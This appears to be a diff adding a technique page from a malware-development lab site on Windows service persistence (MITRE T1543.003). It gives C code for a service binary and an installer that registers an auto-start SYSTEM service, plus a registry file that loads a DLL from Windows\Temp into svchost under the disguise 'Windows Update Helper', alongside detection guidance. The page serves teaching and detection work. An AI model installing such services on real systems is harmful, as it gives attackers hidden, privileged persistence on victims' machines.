@@ -1,0 +1,224 @@
+---
+title: Windows Service Creation
+mitre: T1543.003
+category: persistence
+group: Boot / Logon Autostart
+summary: Install a malicious Windows service that auto-starts at boot under the SYSTEM account.
+platform: [Windows]
+tags: ['C / C++', 'PowerShell', 'SCM']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: OpenSCManager(SC_MANAGER_CREATE_SERVICE)
+    desc: Connect to the Service Control Manager — requires admin or SeServiceLogonRight.
+    dll: advapi32
+  - call: CreateService(SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START)
+    desc: Register the service binary with auto-start type and SYSTEM or a service account principal.
+    dll: advapi32
+  - call: StartService (optional)
+    desc: Start the service immediately; otherwise it starts at the next boot.
+    dll: advapi32
+  - call: (on boot) SCM launches the service binary
+    desc: The service binary receives a SERVICE_START control code and calls StartServiceCtrlDispatcher.
+    dll: advapi32
+detections:
+  - src: WINDOWS EID 7045
+    text: System log event for new service installation — always generated, requires no special audit policy.
+  - src: SYSMON EID 1
+    text: services.exe spawning the new service binary for the first time.
+  - src: REGISTRY
+    text: New key under HKLM\SYSTEM\CurrentControlSet\Services with an ImagePath pointing to a non-standard location.
+  - src: INVENTORY
+    text: Enumerate services and alert on any whose ImagePath is outside System32, Program Files, or approved vendor paths.
+related:
+  - mitre: T1053.005
+    title: Scheduled Tasks
+    desc: Alternative SYSTEM-level persistence with time-based triggering.
+    href: /techniques/persistence/scheduled-tasks
+  - mitre: T1547.001
+    title: Registry Run Keys
+    desc: User-level persistence; no admin required, no SCM interaction.
+    href: /techniques/persistence/registry-run-keys
+  - mitre: T1574.001
+    title: DLL Hijacking
+    desc: A service that loads DLLs from its own directory is vulnerable to hijacking without creating a new service.
+    href: /techniques/persistence/dll-hijacking
+labKit:
+  - label: malservice.c + install.c
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+A Windows service starts automatically at boot, runs under the SYSTEM account by default, and
+survives user logoff. It is one of the most reliable persistence mechanisms on Windows, at the
+cost of requiring administrator rights to install and generating a clearly auditable event
+(EID 7045) that no tuning can suppress.
+
+A malicious service follows the same structure as a legitimate one: a binary with a
+`ServiceMain` function that calls `StartServiceCtrlDispatcher` and handles control codes
+(`SERVICE_STOP`, `SERVICE_PAUSE_CONTINUE`). Without a proper dispatcher, the SCM marks the
+service as failed immediately.
+
+<Callout type="note">
+  EID 7045 is generated for every new service install, on every Windows version, with no audit
+  policy required. It cannot be suppressed through registry manipulation or log clearing without
+  a noticeable gap. Any detection stack that consumes the System event log will see it.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Service binary
+
+<CodeBlock
+  file="malservice.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+
+SERVICE_STATUS        g_status  = {0};
+SERVICE_STATUS_HANDLE g_handle  = NULL;
+
+VOID WINAPI service_ctrl(DWORD ctrl) {
+    if (ctrl == SERVICE_CONTROL_STOP) {
+        g_status.dwCurrentState = SERVICE_STOPPED;
+        SetServiceStatus(g_handle, &g_status);
+    }
+}
+
+VOID WINAPI service_main(DWORD argc, LPWSTR *argv) {
+    g_handle = RegisterServiceCtrlHandlerW(L"UpdateSvc", service_ctrl);
+
+    g_status.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
+    g_status.dwCurrentState            = SERVICE_RUNNING;
+    g_status.dwControlsAccepted        = SERVICE_ACCEPT_STOP;
+    g_status.dwWin32ExitCode           = NO_ERROR;
+    SetServiceStatus(g_handle, &g_status);
+
+    // payload runs here — use a separate thread for long-running work
+    HANDLE t = CreateThread(NULL, 0,
+        (LPTHREAD_START_ROUTINE)payload_thread, NULL, 0, NULL);
+    WaitForSingleObject(t, INFINITE);
+
+    g_status.dwCurrentState = SERVICE_STOPPED;
+    SetServiceStatus(g_handle, &g_status);
+}
+
+int wmain(void) {
+    SERVICE_TABLE_ENTRYW table[] = {
+        { L"UpdateSvc", service_main },
+        { NULL, NULL }
+    };
+    StartServiceCtrlDispatcherW(table);
+    return 0;
+}`}
+/>
+
+### Installer
+
+<CodeBlock
+  file="install.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+
+void install_service(const wchar_t *name, const wchar_t *binary_path) {
+    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    if (!scm) return;
+
+    SC_HANDLE svc = CreateServiceW(
+        scm,
+        name,                           // service name (registry key)
+        name,                           // display name
+        SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS,
+        SERVICE_AUTO_START,             // start at boot
+        SERVICE_ERROR_NORMAL,
+        binary_path,                    // ImagePath
+        NULL,                           // no load ordering group
+        NULL, NULL,                     // no tag, no dependencies
+        L"LocalSystem",                 // run as SYSTEM
+        NULL                            // no password
+    );
+
+    if (svc) {
+        StartServiceW(svc, 0, NULL);    // start now, don't wait for reboot
+        CloseServiceHandle(svc);
+    }
+    CloseServiceHandle(scm);
+}
+
+void remove_service(const wchar_t *name) {
+    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+    SC_HANDLE svc = OpenServiceW(scm, name, SERVICE_STOP | DELETE);
+    SERVICE_STATUS st;
+    ControlService(svc, SERVICE_CONTROL_STOP, &st);
+    DeleteService(svc);
+    CloseServiceHandle(svc);
+    CloseServiceHandle(scm);
+}`}
+/>
+
+## Service types
+
+| Type | ImagePath | Notes |
+|---|---|---|
+| `SERVICE_WIN32_OWN_PROCESS` | Path to EXE | Own process; most common |
+| `SERVICE_WIN32_SHARE_PROCESS` | Path to EXE | Shares svchost.exe process |
+| `SERVICE_KERNEL_DRIVER` | Path to SYS | Kernel driver; requires signing on 64-bit |
+| `SERVICE_FILE_SYSTEM_DRIVER` | Path to SYS | Filesystem minifilter |
+
+**Service sharing** (`SERVICE_WIN32_SHARE_PROCESS`) is how legitimate svchost groups work.
+A malicious DLL registered as a shared service loads into an existing svchost process,
+making it much harder to identify by process image path.
+
+<CodeBlock
+  file="shared_svc_reg.reg"
+  label="registry"
+  lang="ini"
+  class="mb-7.5"
+  code={`; Register a DLL as a shared service loaded into svchost -k netsvcs
+[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\UpdateSvc]
+"Description"="Windows Update Helper"
+"DisplayName"="Windows Update Helper"
+"ErrorControl"=dword:00000001
+"ImagePath"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,\
+  00,74,00,25,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,\
+  73,00,76,00,63,00,68,00,6f,00,73,00,74,00,2e,00,65,00,78,00,65,00,20,00,2d,\
+  00,6b,00,20,00,6e,00,65,00,74,00,73,00,76,00,63,00,73,00,00,00
+"ObjectName"="LocalSystem"
+"Start"=dword:00000002
+"Type"=dword:00000020
+
+[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\UpdateSvc\\Parameters]
+"ServiceDll"="C:\\\\Windows\\\\Temp\\\\update.dll"`}
+/>
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+EID 7045 is non-negotiable: it fires on every service install and cannot be suppressed. Any
+SIEM that ingests the Windows System log will capture it. The most useful enrichment is
+resolving the `ImagePath` and checking whether it is signed, where it lives, and whether its
+hash is known. An unsigned binary outside `System32` or `Program Files` is an immediate
+escalation.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
